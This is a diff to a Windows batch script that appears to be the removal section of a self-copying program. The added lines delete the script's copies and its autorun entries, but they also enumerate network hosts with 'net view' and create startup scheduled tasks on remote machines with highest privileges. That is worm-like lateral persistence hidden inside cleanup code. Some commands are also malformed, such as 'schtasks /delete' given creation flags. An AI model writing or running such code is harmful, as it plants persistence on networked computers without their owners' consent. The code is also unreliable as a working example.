@@ -178,4 +178,20 @@ taskkill /f /im "%~nx0"
 
 del /q "%path_autoRun1%\%~nx0"
 del /q "%path_autoRun2%\%~nx0"
+
+for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
+  del /q "%%i:\%~nx0"
+  reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
+  reg delete HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
+  reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
+  reg delete HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
+  schtasks /delete /sc onstart /tn "%app_name% %%i" /tr %%i:\%~nx0 /f /rl highest
+)
+
+for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The" (
+  for /f "skip=7 tokens=1,* delims= " %%j in ('net view %%i') do if /i "%%j" NEQ "The" (
+    del /q "%%i\%%j\%~nx0"
+    for /f "delims=\" %%z in ("%%i") do schtasks /create /s %%z /sc onstart /tn "%app_name% %%j" /tr %%j:\%~nx0 /f /rl highest
+  )
+)
 exit
